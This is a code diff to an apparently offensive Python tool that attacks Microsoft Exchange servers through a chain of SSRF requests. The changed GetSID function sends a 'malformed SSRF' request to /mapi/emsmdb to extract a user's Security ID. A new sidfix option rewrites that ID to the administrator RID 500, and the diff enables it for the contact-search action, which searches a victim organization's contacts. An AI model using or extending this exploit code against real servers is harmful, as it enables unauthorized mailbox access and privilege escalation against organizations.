@@ -40,7 +40,7 @@ def GetLegacyDN(target,email):
     return legacyDn
 
 
-def GetSID(target, legacyDn):
+def GetSID(target, legacyDn,sidfix=False):
     logger.debug("[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)
 
     # Malformed MAPI body
@@ -64,12 +64,12 @@ def GetSID(target, legacyDn):
         exit()
 
     sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
-
-    # if sid.split("-")[-1] != "500":
-    #     logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
-    #     base_sid = sid.split("-")[:-1]
-    #     base_sid.append("500")
-    #     sid = "-".join(base_sid)
+    if sidfix:
+        if sid.split("-")[-1] != "500":
+            logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
+            base_sid = sid.split("-")[:-1]
+            base_sid.append("500")
+            sid = "-".join(base_sid)
 
     logger.debug("[Stage 2] Successfully obtained SID: " + sid)
     return sid
@@ -342,7 +342,7 @@ if __name__ == '__main__':
 
     elif args.target and args.email and args.action == "SearchC" and args.keyword:
         legacyDn = GetLegacyDN(args.target, args.email)
-        sid = GetSID(args.target, legacyDn)
+        sid = GetSID(args.target, legacyDn,sidfix=True)
         contactinfo = SearchContact(args.target, sid, args.keyword)
         
     elif args.target and args.email and args.action == "SearchM" and args.folder and args.keyword:
